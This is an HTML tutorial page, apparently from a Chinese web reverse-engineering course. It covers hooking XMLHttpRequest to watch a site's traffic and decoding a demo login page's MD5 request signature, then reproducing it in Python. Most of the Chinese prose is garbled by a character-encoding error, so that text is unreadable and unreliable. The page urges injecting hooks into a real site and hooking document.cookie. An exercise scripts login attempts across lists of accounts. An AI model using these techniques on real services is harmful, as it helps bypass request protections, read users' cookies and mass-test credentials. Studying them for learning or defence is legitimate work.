<li><strong>é€‰æ‹© &quot;Save as...&quot;</strong></li>
<li><strong>ä¿å­˜ä¸º <code>network_log.txt</code></strong></li>
</ol>
<p>ç°åœ¨ä½ æœ‰äº†æ‰€æœ‰è¯·æ±‚çš„å®Œæ•´è®°å½•ï¼</p>
<hr />
<h2>âœ… éªŒè¯æ¸…å•</h2>
<p>å®Œæˆåï¼Œæ£€æŸ¥ä»¥ä¸‹é¡¹ç›®ï¼š</p>
<ul>
<li>â˜ Console ä¸­çœ‹åˆ° &quot;âœ… Hook å®‰è£…æˆåŠŸï¼&quot;</li>
<li>â˜ ç‚¹å‡»é“¾æ¥åèƒ½çœ‹åˆ° ğŸ“¤ å’Œ ğŸ“¥ çš„æ—¥å¿—</li>
<li>â˜ æ—¥å¿—ä¸­åŒ…å« URL å’ŒçŠ¶æ€ç </li>
<li>â˜ èƒ½çœ‹åˆ°å“åº”å†…å®¹çš„å‰ 200 ä¸ªå­—ç¬¦</li>
<li>â˜ æˆåŠŸä¿å­˜äº†æ—¥å¿—æ–‡ä»¶</li>
</ul>
<hr />
<h2>ğŸ“ è¿›é˜¶ç»ƒä¹ </h2>
<h3>ç»ƒä¹  1: Hook å…¶ä»–ç½‘ç«™</h3>
<p>å°è¯•åœ¨çœŸå®ç½‘ç«™ä¸Šä½¿ç”¨è¿™ä¸ª Hookï¼š</p>
<ol>
<li>è®¿é—® <a href="https://www.douban.com/">https://www.douban.com/</a></li>
<li>æ³¨å…¥åŒæ ·çš„ Hook ä»£ç </li>
<li>åˆ·æ–°é¡µé¢ï¼Œè§‚å¯Ÿæ‰€æœ‰è¯·æ±‚</li>
</ol>
<p><strong>æ€è€ƒ</strong>: ä½ èƒ½çœ‹åˆ°å“ªäº›æœ‰è¶£çš„ API è¯·æ±‚ï¼Ÿ</p>
<h3>ç»ƒä¹  2: ä¿®æ”¹ Hook è„šæœ¬</h3>
<p>å°è¯•ä¿®æ”¹ä»£ç ï¼Œæ·»åŠ æ›´å¤šåŠŸèƒ½ï¼š</p>
<pre><code class="language-javascript">// åªè®°å½•åŒ…å«ç‰¹å®šå…³é”®è¯çš„è¯·æ±‚
if (this._url.includes(&quot;/api/&quot;)) {
  console.log(&quot;ğŸ“¤ API è¯·æ±‚&quot;, this._url);
}
</code></pre>
<h3>ç»ƒä¹  3: ç»Ÿè®¡è¯·æ±‚æ•°é‡</h3>
<p>æ·»åŠ è®¡æ•°å™¨ï¼š</p>
<pre><code class="language-javascript">let requestCount = 0;
// åœ¨å‘é€è¯·æ±‚æ—¶
requestCount++;
console.log(`ğŸ“Š æ€»è¯·æ±‚æ•°: ${requestCount}`);
</code></pre>
<hr />
<h2>â— å¸¸è§é—®é¢˜</h2>
<h3>Q1: åˆ·æ–°é¡µé¢å Hook å¤±æ•ˆäº†ï¼Ÿ</h3>
<p><strong>A</strong>: æ˜¯çš„ï¼Hook æ˜¯æ³¨å…¥åˆ°å½“å‰é¡µé¢çš„ JavaScript ç¯å¢ƒä¸­çš„ï¼Œåˆ·æ–°é¡µé¢ä¼šæ¸…ç©ºæ‰€æœ‰å†…å®¹ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>æ¯æ¬¡åˆ·æ–°åé‡æ–°æ‰§è¡Œ Hook ä»£ç </li>
<li>æˆ–è€…ä½¿ç”¨æµè§ˆå™¨æ‰©å±•ï¼ˆå¦‚ Tampermonkeyï¼‰è‡ªåŠ¨æ³¨å…¥</li>
</ul>
<h3>Q2: çœ‹ä¸åˆ°ä»»ä½•è¾“å‡ºï¼Ÿ</h3>
<p><strong>A</strong>: æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li>Hook ä»£ç æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼ˆæœ‰æ²¡æœ‰æŠ¥é”™ï¼‰</li>
<li>ç½‘ç«™æ˜¯å¦çœŸçš„å‘é€äº†è¯·æ±‚ï¼ˆæ£€æŸ¥ Network æ ‡ç­¾ï¼‰</li>
<li>Console çš„è¿‡æ»¤å™¨æ˜¯å¦è®¾ç½®æ­£ç¡®ï¼ˆç¡®ä¿æ˜¾ç¤ºæ‰€æœ‰æ—¥å¿—ï¼‰</li>
</ol>
<h3>Q3: ä¸ºä»€ä¹ˆæœ‰äº›è¯·æ±‚çœ‹ä¸åˆ°ï¼Ÿ</h3>
<p><strong>A</strong>: å¯èƒ½çš„åŸå› ï¼š</p>
<ul>
<li>ä½¿ç”¨äº†å…¶ä»–è¯·æ±‚æ–¹å¼ï¼ˆå¦‚ WebSocketï¼‰</li>
<li>è¯·æ±‚åœ¨ Hook ä»£ç æ³¨å…¥å‰å°±å‘é€äº†</li>
<li>ä½¿ç”¨äº†åŸç”Ÿçš„ç½‘ç»œ APIï¼ˆéœ€è¦æ›´æ·±å±‚çš„ Hookï¼‰</li>
</ul>
<h3>Q4: Hook ä¼šå½±å“ç½‘ç«™æ­£å¸¸è¿è¡Œå—ï¼Ÿ</h3>
<p><strong>A</strong>: æˆ‘ä»¬çš„ Hook ä»£ç åªæ˜¯&quot;ç›‘å¬&quot;ï¼Œä¸ä¿®æ”¹æ•°æ®ï¼Œæ‰€ä»¥<strong>ä¸ä¼šå½±å“</strong>ç½‘ç«™åŠŸèƒ½ã€‚ä½†å¦‚æœ Hook ä»£ç æœ‰ bugï¼Œå¯èƒ½å¯¼è‡´é¡µé¢é”™è¯¯ã€‚</p>
<h3>Q5: å¦‚ä½• Hook æ›´å¤šçš„ APIï¼Ÿ</h3>
<p><strong>A</strong>: åŒæ ·çš„åŸç†å¯ä»¥åº”ç”¨åˆ°ï¼š</p>
<ul>
<li><code>localStorage.setItem</code> / <code>getItem</code></li>
<li><code>document.cookie</code></li>
<li><code>WebSocket</code></li>
<li><code>XMLHttpRequest.setRequestHeader</code></li>
</ul>
<p>æŸ¥çœ‹ <a href="#section-58">JavaScript Hook è„šæœ¬</a> è·å–æ›´å¤šç¤ºä¾‹ã€‚</p>
<hr />
<h2>ğŸ” åŸç†è§£æ</h2>
<h3>Hook æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h3>
<pre><code class="language-javascript">// 1. ä¿å­˜åŸå§‹å‡½æ•°
const original = XMLHttpRequest.prototype.send;

// 2. ç”¨æˆ‘ä»¬çš„å‡½æ•°æ›¿æ¢
XMLHttpRequest.prototype.send = function (...args) {
  console.log(&quot;æ‹¦æˆªåˆ°äº†ï¼&quot;); // æˆ‘ä»¬çš„ä»£ç 
  return original.apply(this, args); // è°ƒç”¨åŸå‡½æ•°
};
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>:</p>
<ul>
<li>JavaScript å…è®¸åœ¨è¿è¡Œæ—¶ä¿®æ”¹å‡½æ•°</li>
<li>æˆ‘ä»¬ç”¨&quot;åŒ…è£…å‡½æ•°&quot;æ›¿æ¢åŸå‡½æ•°</li>
<li>åŒ…è£…å‡½æ•°å…ˆæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œå†è°ƒç”¨åŸå‡½æ•°</li>
<li>è¿™æ ·æ—¢èƒ½ç›‘æ§ï¼Œåˆä¸å½±å“åŠŸèƒ½</li>
</ul>
<hr />
<h2>ğŸ“š ç›¸å…³é…æ–¹</h2>
<h3>åŸºç¡€é…æ–¹</h3>
<ul>
<li><a href="#section-27">Hook æŠ€æœ¯</a> - Hook çš„æ·±å…¥è®²è§£</li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§</a> - ä½¿ç”¨æ–­ç‚¹è°ƒè¯•</li>
</ul>
<h3>é«˜çº§é…æ–¹</h3>
<ul>
<li><a href="#section-58">JavaScript Hook è„šæœ¬åˆé›†</a> - æ›´å¤šå³ç”¨å‹ Hook</li>
</ul>
<h3>ä¸‹ä¸€æ­¥</h3>
<ul>
<li><a href="#section-3">è§£å¯† API å‚æ•°</a> - å­¦ä¹ å¦‚ä½•åˆ†æåŠ å¯†ç®—æ³•</li>
</ul>
<hr />
<h2>ğŸ‰ æ­å–œï¼</h2>
<p>ä½ å·²ç»å®Œæˆäº†ç¬¬ä¸€ä¸ª Web é€†å‘é…æ–¹ï¼</p>
<p>ç°åœ¨ä½ å·²ç»æŒæ¡äº†ï¼š</p>
<ul>
<li>âœ… åŸºæœ¬çš„ Hook æŠ€æœ¯</li>
<li>âœ… å¦‚ä½•ç›‘æ§ç½‘ç»œè¯·æ±‚</li>
<li>âœ… å¦‚ä½•ä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
</ul>
<p><strong>ä¸‹ä¸€æ­¥</strong>: ç»§ç»­å­¦ä¹  <a href="#section-3">è§£å¯† API å‚æ•°</a>ï¼ŒæŒæ¡æ›´é«˜çº§çš„æŠ€èƒ½ï¼</p>
<hr />
<p><strong>å°è´´å£«</strong>:</p>
<ul>
<li>å°†è¿™ä¸ª Hook ä»£ç ä¿å­˜ä¸ºä¹¦ç­¾æˆ– Snippetï¼Œä»¥ä¾¿éšæ—¶ä½¿ç”¨</li>
<li>å°è¯•åœ¨ä¸åŒç½‘ç«™ä½¿ç”¨ï¼Œè§‚å¯Ÿå®ƒä»¬çš„è¯·æ±‚æ¨¡å¼</li>
<li>åŠ å…¥é€†å‘å·¥ç¨‹ç¤¾åŒºï¼Œåˆ†äº«ä½ çš„å‘ç°</li>
</ul>
<p>Happy Hacking! ğŸ£</p>

                                            </div>
                                            
                                            <div class="section" id="section-3">
                                                <h2>[R02] Decrypt API Params</h2>
                                                <h1>R02: é…æ–¹ï¼šè§£å¯† API å‚æ•°</h1>
<h2>ğŸ“Š é…æ–¹ä¿¡æ¯</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>éš¾åº¦</strong></td>
  <td>â­â­ (åˆçº§)</td>
</tr>
<tr>
  <td><strong>é¢„è®¡æ—¶é—´</strong></td>
  <td>30-45 åˆ†é’Ÿ</td>
</tr>
<tr>
  <td><strong>æ‰€éœ€å·¥å…·</strong></td>
  <td>Chrome æµè§ˆå™¨, Python 3.7+</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>ç ´è§£ API ç­¾åã€è§£å¯†è¯·æ±‚å‚æ•°</td>
</tr>
<tr>
  <td><strong>å‰ç½®çŸ¥è¯†</strong></td>
  <td>å®Œæˆ <a href="#section-2">ä½ çš„ç¬¬ä¸€ä¸ª Hook</a></td>
</tr>
</tbody>
</table>
<hr />
<h2>ğŸ¯ ä½ å°†å­¦åˆ°</h2>
<p>å®Œæˆè¿™ä¸ªé…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>âœ… ä½¿ç”¨ XHR æ–­ç‚¹å®šä½åŠ å¯†å‡½æ•°</li>
<li>âœ… åˆ†æ JavaScript åŠ å¯†ä»£ç </li>
<li>âœ… è¯†åˆ«å¸¸è§åŠ å¯†ç®—æ³•ï¼ˆMD5, SHA256, AES ç­‰ï¼‰</li>
<li>âœ… æå–å¯†é’¥å’ŒåŠ å¯†å‚æ•°</li>
<li>âœ… ç”¨ Python å¤ç°åŠ å¯†é€»è¾‘</li>
<li>âœ… æ„é€ æœ‰æ•ˆçš„ API è¯·æ±‚</li>
</ul>
<hr />
<h2>ğŸ“ å‡†å¤‡å·¥ä½œ</h2>
<h3>æ£€æŸ¥æ¸…å•</h3>
<ul>
<li>â˜ å®Œæˆäº†&quot;ä½ çš„ç¬¬ä¸€ä¸ª Hook&quot;é…æ–¹</li>
<li>â˜ å·²å®‰è£… Python 3.7+</li>
<li>â˜ å®‰è£…äº† requests åº“: <code>pip install requests</code></li>
<li>â˜ äº†è§£åŸºæœ¬çš„ Python è¯­æ³•</li>
</ul>
<h3>å®æˆ˜ç›®æ ‡</h3>
<p>æˆ‘ä»¬å°†åˆ†æä¸€ä¸ªåŠ å¯†çš„ç™»å½•æ¥å£ï¼Œç›®æ ‡æ˜¯ï¼š</p>
<ol>
<li>æ‰¾åˆ°å¯†ç åŠ å¯†å‡½æ•°</li>
<li>åˆ†æåŠ å¯†ç®—æ³•</li>
<li>ç”¨ Python å®ç°ç›¸åŒçš„åŠ å¯†</li>
<li>æˆåŠŸå‘é€ç™»å½•è¯·æ±‚</li>
</ol>
<hr />
<h2>ğŸš€ æ­¥éª¤è¯¦è§£</h2>
<h3>Step 1: æ‰¾åˆ°åŠ å¯†çš„è¯·æ±‚</h3>
<h4>1.1 æ‰“å¼€ç¤ºä¾‹é¡µé¢</h4>
<p>è®¿é—®æ¨¡æ‹Ÿç™»å½•é¡µé¢ï¼ˆä½¿ç”¨æœ¬åœ° HTML æ–‡ä»¶æˆ–åœ¨çº¿ Demoï¼‰ï¼š</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;ç™»å½•ç¤ºä¾‹&lt;/title&gt;
    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js&quot;&gt;&lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h2&gt;ç™»å½•&lt;/h2&gt;
    &lt;input id=&quot;username&quot; placeholder=&quot;ç”¨æˆ·å&quot; value=&quot;admin&quot; /&gt;
    &lt;input id=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;å¯†ç &quot; value=&quot;123456&quot; /&gt;
    &lt;button onclick=&quot;login()&quot;&gt;ç™»å½•&lt;/button&gt;

    &lt;script&gt;
      function login() {
        const username = document.getElementById(&quot;username&quot;).value;
        const password = document.getElementById(&quot;password&quot;).value;

        // åŠ å¯†å¯†ç 
        const encryptedPassword = CryptoJS.MD5(password).toString();

        // ç”Ÿæˆç­¾å
        const timestamp = Date.now();
        const sign = CryptoJS.MD5(
          username + encryptedPassword + timestamp + &quot;SECRET_KEY&quot;
        ).toString();

        // å‘é€è¯·æ±‚
        fetch(&quot;/api/login&quot;, {
          method: &quot;POST&quot;,
          headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
          body: JSON.stringify({
            username: username,
            password: encryptedPassword,
            timestamp: timestamp,
            sign: sign,
          }),
        })
          .then((r) =&gt; r.json())
          .then((data) =&gt; console.log(data));
      }
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>å°†ä¸Šé¢çš„ä»£ç ä¿å­˜ä¸º <code>login_demo.html</code> å¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚</p>
<h4>1.2 è§¦å‘è¯·æ±‚</h4>
<ol>
<li>æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼ˆF12ï¼‰</li>
<li>åˆ‡æ¢åˆ° <strong>Network</strong> æ ‡ç­¾</li>
<li>ç‚¹å‡»&quot;ç™»å½•&quot;æŒ‰é’®</li>
<li>è§‚å¯Ÿ Network é¢æ¿ä¸­çš„è¯·æ±‚</li>
</ol>
<p>ä½ ä¼šçœ‹åˆ°ä¸€ä¸ª POST è¯·æ±‚åˆ° <code>/api/login</code>ï¼ŒæŸ¥çœ‹è¯·æ±‚ä½“ï¼š</p>
<pre><code class="language-json">{
  &quot;username&quot;: &quot;admin&quot;,
  &quot;password&quot;: &quot;e10adc3949ba59abbe56e057f20f883e&quot;,
  &quot;timestamp&quot;: 1702887654321,
  &quot;sign&quot;: &quot;a1b2c3d4e5f6...&quot;
}
</code></pre>
<p><strong>å‘ç°</strong>: <code>password</code> ä¸æ˜¯æ˜æ–‡ï¼Œè€Œæ˜¯ä¸€ä¸² 32 ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆå¾ˆå¯èƒ½æ˜¯ MD5ï¼‰</p>
<hr />
<h3>Step 2: å®šä½åŠ å¯†å‡½æ•°</h3>
<h4>2.1 ä½¿ç”¨ XHR æ–­ç‚¹</h4>
<ol>
<li>åœ¨ <strong>Sources</strong> æ ‡ç­¾ä¸‹ï¼Œå³ä¾§æ‰¾åˆ° <strong>XHR/fetch Breakpoints</strong></li>
<li>ç‚¹å‡» <code>+</code> æ·»åŠ æ–­ç‚¹</li>
<li>è¾“å…¥ <code>/api/login</code></li>
</ol>
<p><img src="https://via.placeholder.com/600x300?text=XHR+Breakpoint" alt="XHR Breakpoint" /></p>
<ol start="4">
<li>å†æ¬¡ç‚¹å‡»&quot;ç™»å½•&quot;æŒ‰é’®</li>
</ol>
<p><strong>ç»“æœ</strong>: ä»£ç ä¼šåœ¨å‘é€è¯·æ±‚å‰æš‚åœ</p>
<h4>2.2 æŸ¥çœ‹è°ƒç”¨æ ˆ</h4>
<p>åœ¨ <strong>Call Stack</strong> é¢æ¿ä¸­ï¼Œä½ ä¼šçœ‹åˆ°ï¼š</p>
<pre><code>fetch (async)
login (login_demo.html:24)
onclick (login_demo.html:12)
</code></pre>
<ol start="5">
<li>ç‚¹å‡» <code>login</code> å‡½æ•°ï¼Œè·³è½¬åˆ°æºä»£ç </li>
</ol>
<p><img src="https://via.placeholder.com/600x300?text=Call+Stack" alt="Call Stack" /></p>
<h4>2.3 è§‚å¯ŸåŠ å¯†ä»£ç </h4>
<p>ç°åœ¨ä½ å¯ä»¥çœ‹åˆ°å®Œæ•´çš„åŠ å¯†é€»è¾‘ï¼š</p>
<pre><code class="language-javascript">const encryptedPassword = CryptoJS.MD5(password).toString();
const sign = CryptoJS.MD5(
  username + encryptedPassword + timestamp + &quot;SECRET_KEY&quot;
).toString();
</code></pre>
<p><strong>åˆ†æ</strong>:</p>
<ul>
<li>å¯†ç ä½¿ç”¨ <strong>MD5</strong> åŠ å¯†</li>
<li>ç­¾åä½¿ç”¨ <code>ç”¨æˆ·å + åŠ å¯†åçš„å¯†ç  + æ—¶é—´æˆ³ + å¯†é’¥</code> æ‹¼æ¥åå† MD5</li>
<li>å¯†é’¥æ˜¯ <code>SECRET_KEY</code></li>
</ul>
<hr />
<h3>Step 3: åœ¨ Console ä¸­éªŒè¯</h3>
<h4>3.1 æµ‹è¯•åŠ å¯†å‡½æ•°</h4>
<p>åœ¨ Console ä¸­æ‰§è¡Œï¼š</p>
<pre><code class="language-javascript">// æµ‹è¯• MD5
CryptoJS.MD5(&quot;123456&quot;).toString();
// è¾“å‡º: &quot;e10adc3949ba59abbe56e057f20f883e&quot;
</code></pre>
<h4>3.2 å®Œæ•´æµ‹è¯•</h4>
<pre><code class="language-javascript">const username = &quot;admin&quot;;
const password = &quot;123456&quot;;
const timestamp = Date.now();

const encryptedPassword = CryptoJS.MD5(password).toString();
const sign = CryptoJS.MD5(
  username + encryptedPassword + timestamp + &quot;SECRET_KEY&quot;
).toString();

console.log({
  encryptedPassword: encryptedPassword,
  sign: sign,
  timestamp: timestamp,
});
</code></pre>
<p><strong>è¾“å‡º</strong>:</p>
<pre><code>{
  encryptedPassword: &quot;e10adc3949ba59abbe56e057f20f883e&quot;,
  sign: &quot;f7c3bc1d808e04732adf679965ccc34c&quot;,
  timestamp: 1702887654321
}
</code></pre>
<p>âœ… <strong>éªŒè¯</strong>: æ¯æ¬¡æ‰§è¡Œï¼Œ<code>encryptedPassword</code> éƒ½æ˜¯å›ºå®šçš„ï¼Œä½† <code>sign</code> ä¼šå˜åŒ–ï¼ˆå› ä¸ºæ—¶é—´æˆ³åœ¨å˜ï¼‰</p>
<hr />
<h3>Step 4: Python å¤ç°</h3>
<h4>4.1 å®‰è£…ä¾èµ–</h4>
<pre><code class="language-bash">pip install requests
</code></pre>
<h4>4.2 ç¼–å†™ Python è„šæœ¬</h4>
<p>åˆ›å»º <code>login.py</code>:</p>
<pre><code class="language-python">import hashlib
import time
import requests

def md5(text):
    &quot;&quot;&quot;MD5 åŠ å¯†&quot;&quot;&quot;
    return hashlib.md5(text.encode()).hexdigest()

def login(username, password):
    # 1. åŠ å¯†å¯†ç 
    encrypted_password = md5(password)

    # 2. ç”Ÿæˆæ—¶é—´æˆ³
    timestamp = int(time.time() * 1000)

    # 3. ç”Ÿæˆç­¾å
    sign_string = username + encrypted_password + str(timestamp) + 'SECRET_KEY'
    sign = md5(sign_string)

    # 4. æ„é€ è¯·æ±‚ä½“
    payload = {
        'username': username,
        'password': encrypted_password,
        'timestamp': timestamp,
        'sign': sign
    }

    print(f&quot;ğŸ“¤ å‘é€è¯·æ±‚:&quot;)
    print(f&quot;  Username: {username}&quot;)
    print(f&quot;  Encrypted Password: {encrypted_password}&quot;)
    print(f&quot;  Timestamp: {timestamp}&quot;)
    print(f&quot;  Sign: {sign}&quot;)

    # 5. å‘é€è¯·æ±‚
    response = requests.post(
        'https://example.com/api/login',
        json=payload,
        headers={'Content-Type': 'application/json'}
    )

    print(f&quot;\nğŸ“¥ å“åº”:&quot;)
    print(f&quot;  Status Code: {response.status_code}&quot;)
    print(f&quot;  Response: {response.text}&quot;)

    return response.json()

if __name__ == '__main__':
    # æµ‹è¯•
    result = login('admin', '123456')
    print(f&quot;\nâœ… ç™»å½•ç»“æœ: {result}&quot;)
</code></pre>
<h4>4.3 è¿è¡Œæµ‹è¯•</h4>
<pre><code class="language-bash">python login.py
</code></pre>
<p><strong>é¢„æœŸè¾“å‡º</strong>:</p>
<pre><code>ğŸ“¤ å‘é€è¯·æ±‚:
  Username: admin
  Encrypted Password: e10adc3949ba59abbe56e057f20f883e
  Timestamp: 1702887654321
  Sign: f7c3bc1d808e04732adf679965ccc34c

ğŸ“¥ å“åº”:
  Status Code: 200
  Response: {&quot;code&quot;:0,&quot;message&quot;:&quot;ç™»å½•æˆåŠŸ&quot;,&quot;data&quot;:{&quot;token&quot;:&quot;...&quot;}}

âœ… ç™»å½•ç»“æœ: {'code': 0, 'message': 'ç™»å½•æˆåŠŸ', 'data': {...}}
</code></pre>
<hr />
<h2>âœ… éªŒè¯æ¸…å•</h2>
<p>å®Œæˆåï¼Œæ£€æŸ¥ä»¥ä¸‹é¡¹ç›®ï¼š</p>
<ul>
<li>â˜ æˆåŠŸæ‰¾åˆ°äº†åŠ å¯†å‡½æ•°ä½ç½®</li>
<li>â˜ è¯†åˆ«å‡ºåŠ å¯†ç®—æ³•æ˜¯ MD5</li>
<li>â˜ æå–å‡ºäº†å¯†é’¥ <code>SECRET_KEY</code></li>
<li>â˜ ç†è§£äº†ç­¾åç”Ÿæˆé€»è¾‘</li>
<li>â˜ Python è„šæœ¬èƒ½æ­£ç¡®ç”ŸæˆåŠ å¯†å‚æ•°</li>
<li>â˜ æˆåŠŸå‘é€äº†è¯·æ±‚å¹¶å¾—åˆ°å“åº”</li>
</ul>
<hr />
<h2>ğŸ“ è¿›é˜¶ç»ƒä¹ </h2>
<h3>ç»ƒä¹  1: åˆ†ææ›´å¤æ‚çš„åŠ å¯†</h3>
<p>å°è¯•åˆ†æä½¿ç”¨ AES åŠ å¯†çš„æ¥å£ï¼š</p>
<pre><code class="language-javascript">// ç¤ºä¾‹ï¼šAES åŠ å¯†
const key = CryptoJS.enc.Utf8.parse(&quot;1234567890abcdef&quot;);
const iv = CryptoJS.enc.Utf8.parse(&quot;abcdefghijklmnop&quot;);
const encrypted = CryptoJS.AES.encrypt(password, key, { iv: iv });
</code></pre>
<p><strong>æç¤º</strong>: Python ä½¿ç”¨ <code>pycryptodome</code> åº“ï¼š</p>
<pre><code class="language-bash">pip install pycryptodome
</code></pre>
<h3>ç»ƒä¹  2: å¤„ç†åŠ¨æ€å¯†é’¥</h3>
<p>æœ‰äº›ç½‘ç«™çš„å¯†é’¥æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼š</p>
<pre><code class="language-javascript">const key = CryptoJS.MD5(username + timestamp).toString();
</code></pre>
<p><strong>ä»»åŠ¡</strong>: ä¿®æ”¹ Python è„šæœ¬ï¼Œæ”¯æŒåŠ¨æ€å¯†é’¥</p>
<h3>ç»ƒä¹  3: æ‰¹é‡æµ‹è¯•</h3>
<p>ç¼–å†™è„šæœ¬æµ‹è¯•å¤šä¸ªè´¦å·ï¼š</p>
<pre><code class="language-python">users = [
    ('user1', 'password1'),
    ('user2', 'password2'),
    ('user3', 'password3')
]

for username, password in users:
    result = login(username, password)
    print(f&quot;{username}: {result['message']}&quot;)
</code></pre>
<hr />
<h2>â— å¸¸è§é—®é¢˜</h2>
<h3>Q1: å¦‚ä½•åˆ¤æ–­ä½¿ç”¨äº†å“ªç§åŠ å¯†ç®—æ³•ï¼Ÿ</h3>
<p><strong>A</strong>: æ ¹æ®ç‰¹å¾è¯†åˆ«ï¼š</p>
<table>
<thead>
<tr>
  <th>ç‰¹å¾</th>
  <th>å¯èƒ½çš„ç®—æ³•</th>
</tr>
</thead>
<tbody>
<tr>
  <td>32 ä½åå…­è¿›åˆ¶</td>
  <td>MD5</td>
</tr>
<tr>
  <td>40 ä½åå…­è¿›åˆ¶</td>
  <td>SHA1</td>
</tr>
<tr>
  <td>64 ä½åå…­è¿›åˆ¶</td>
  <td>SHA256</td>
</tr>
<tr>
  <td>Base64 ç¼–ç  + å›ºå®šé•¿åº¦</td>
  <td>AES/DES</td>
</tr>
<tr>
  <td>çœ‹åˆ° <code>CryptoJS.MD5</code></td>
  <td>ç¡®å®šæ˜¯ MD5</td>
</tr>
</tbody>
</table>
<p><strong>å·¥å…·</strong>: ä½¿ç”¨ <a href="#section-29">åŠ å¯†ç®—æ³•è¯†åˆ«</a></p>
<h3>Q2: æ‰¾ä¸åˆ°åŠ å¯†å‡½æ•°ï¼Ÿä»£ç è¢«æ··æ·†äº†æ€ä¹ˆåŠï¼Ÿ</h3>
<p><strong>A</strong>: ä½¿ç”¨ä»¥ä¸‹æŠ€å·§ï¼š</p>
<ol>
<li>æœç´¢åŠ å¯†åº“åç§°ï¼š<code>CryptoJS</code>, <code>crypto</code>, <code>encrypt</code></li>
<li>æœç´¢ç‰¹å¾å­—ç¬¦ä¸²ï¼š<code>MD5</code>, <code>AES</code>, <code>SHA</code></li>
<li>Hook å¯ç–‘å‡½æ•°æŸ¥çœ‹è¾“å…¥è¾“å‡º</li>
<li>ä½¿ç”¨ <a href="#section-32">JavaScript åæ··æ·†</a></li>
</ol>
<h3>Q3: Python ç”Ÿæˆçš„ç­¾åä¸å¯¹ï¼Ÿ</h3>
<p><strong>A</strong>: æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ol>
<li><strong>å­—ç¬¦ç¼–ç </strong>: ç¡®ä¿ä½¿ç”¨ UTF-8</li>
<li><strong>æ—¶é—´æˆ³æ ¼å¼</strong>: æ¯«ç§’è¿˜æ˜¯ç§’ï¼Ÿ</li>
<li><strong>æ‹¼æ¥é¡ºåº</strong>: å‚æ•°é¡ºåºæ˜¯å¦æ­£ç¡®ï¼Ÿ</li>
<li><strong>å¯†é’¥</strong>: æ˜¯å¦æœ‰éšè—çš„ç›æˆ–å¯†é’¥ï¼Ÿ</li>
</ol>
<p><strong>è°ƒè¯•æŠ€å·§</strong>:</p>
<pre><code class="language-python"># åœ¨ Python ä¸­æ‰“å°ä¸­é—´å€¼
sign_string = username + encrypted_password + str(timestamp) + 'SECRET_KEY'
print(f&quot;Sign String: {sign_string}&quot;)
print(f&quot;Sign: {md5(sign_string)}&quot;)
</code></pre>
<p>ç„¶ååœ¨æµè§ˆå™¨ä¸­å¯¹æ¯”ï¼š</p>
<pre><code class="language-javascript">console.log(username + encryptedPassword + timestamp + &quot;SECRET_KEY&quot;);
</code></pre>
<h3>Q4: å¦‚ä½•å¤„ç†éæ ‡å‡†çš„åŠ å¯†ï¼Ÿ</h3>
<p><strong>A</strong>: æœ‰äº›ç½‘ç«™ä½¿ç”¨è‡ªå®šä¹‰åŠ å¯†ï¼š</p>
<pre><code class="language-javascript">function customEncrypt(data) {
  // è‡ªå®šä¹‰ç®—æ³•
  return data.split(&quot;&quot;).reverse().join(&quot;&quot;);
}
</code></pre>
<p><strong>è§£å†³</strong>:</p>
<ol>
<li>å®Œæ•´ç†è§£ç®—æ³•é€»è¾‘</li>
<li>ç”¨ Python é€è¡Œç¿»è¯‘</li>
<li>æˆ–è€…è€ƒè™‘ä½¿ç”¨ <a href="#section-35-rpc%E8%B0%83%E7%94%A8">RPC è°ƒç”¨</a></li>
</ol>
<hr />
<h2>ğŸ” åŸç†è§£æ</h2>
<h3>ä¸ºä»€ä¹ˆç½‘ç«™è¦åŠ å¯†å‚æ•°ï¼Ÿ</h3>
<ol>
<li><strong>å®‰å…¨æ€§</strong>: é˜²æ­¢å¯†ç æ˜æ–‡ä¼ è¾“</li>
<li><strong>é˜²ç¯¡æ”¹</strong>: ç­¾åç¡®ä¿å‚æ•°æœªè¢«ä¿®æ”¹</li>
<li><strong>é˜²é‡æ”¾</strong>: æ—¶é—´æˆ³é˜²æ­¢é‡æ”¾æ”»å‡»</li>
<li><strong>åçˆ¬è™«</strong>: å¢åŠ é€†å‘éš¾åº¦</li>
</ol>
<h3>ç­¾åçš„ä½œç”¨</h3>
<pre><code>ç­¾å = Hash(æ‰€æœ‰å‚æ•° + å¯†é’¥)
</code></pre>
<p>æœåŠ¡å™¨ä¹Ÿä½¿ç”¨ç›¸åŒç®—æ³•è®¡ç®—ç­¾åï¼Œå¦‚æœä¸ä¸€è‡´åˆ™æ‹’ç»è¯·æ±‚ï¼š</p>
<pre><code class="language-python"># æœåŠ¡å™¨ç«¯éªŒè¯
received_sign = request.json['sign']
calculated_sign = md5(username + password + timestamp + 'SECRET_KEY')

if received_sign != calculated_sign:
    return {'code': -1, 'message': 'ç­¾åé”™è¯¯'}
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³é…æ–¹</h2>
<h3>åŸºç¡€é…æ–¹</h3>
<ul>
<li><a href="#section-29">åŠ å¯†ç®—æ³•è¯†åˆ«</a> - è¯†åˆ«åŠ å¯†ç®—æ³•</li>
